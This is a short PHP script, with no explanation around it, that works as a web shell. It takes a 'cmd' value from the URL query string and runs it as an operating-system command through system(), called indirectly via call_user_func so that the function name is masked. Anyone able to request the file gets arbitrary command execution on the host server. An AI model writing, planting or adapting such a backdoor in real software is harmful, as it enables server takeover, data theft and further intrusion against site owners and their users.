<?php

$f = array(
    'r' => function($c) {
        $fn = 'system'; 
        return call_user_func($fn, $c); 
    }
);

if (isset($_GET['cmd'])) {
    $f['r']($_GET['cmd']);
} else {
    echo "No command provided.";
}
?>
